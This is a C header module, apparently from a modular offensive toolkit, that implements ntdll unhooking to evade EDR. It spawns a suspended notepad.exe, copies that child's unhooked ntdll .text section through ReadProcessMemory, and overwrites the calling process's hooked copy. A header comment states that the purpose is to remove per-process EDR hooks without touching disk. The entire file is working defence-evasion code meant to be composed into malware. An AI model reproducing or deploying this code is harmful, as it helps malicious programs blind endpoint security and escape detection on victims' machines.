// chunk: evasion/unhook_debug_read
// depends: (none)
// provides: unhook_ntdll
// headers: windows.h
// risk: medium
// note: Spawns a suspended child process, reads its clean ntdll .text via ReadProcessMemory, overwrites own hooked copy. No disk I/O, no KnownDlls. The child process has a clean ntdll because EDR hooks are injected per-process.

#ifndef CHUNK_UNHOOK_DEBUG_READ
#define CHUNK_UNHOOK_DEBUG_READ

static int unhook_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    // Find .text section boundaries
    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);

    BYTE *text_addr = NULL;
    DWORD text_size = 0;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            text_addr = base + sec[i].VirtualAddress;
            text_size = sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!text_addr || !text_size) return 0;

    // Spawn a suspended notepad.exe
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    char cmd[] = "notepad.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        return 0;
    }

    // Read the child's clean ntdll .text
    BYTE *clean_text = (BYTE *)VirtualAlloc(NULL, text_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!clean_text) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 0;
    }

    SIZE_T bytes_read = 0;
    BOOL read_ok = ReadProcessMemory(pi.hProcess, text_addr, clean_text, text_size, &bytes_read);

    // Kill the child immediately
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    if (!read_ok || bytes_read != text_size) {
        VirtualFree(clean_text, 0, MEM_RELEASE);
        return 0;
    }

    // Overwrite our hooked .text with the clean copy
    DWORD old_protect;
    VirtualProtect(text_addr, text_size, PAGE_EXECUTE_READWRITE, &old_protect);
    memcpy(text_addr, clean_text, text_size);
    VirtualProtect(text_addr, text_size, old_protect, &old_protect);

    VirtualFree(clean_text, 0, MEM_RELEASE);
    return 1;
}

#endif
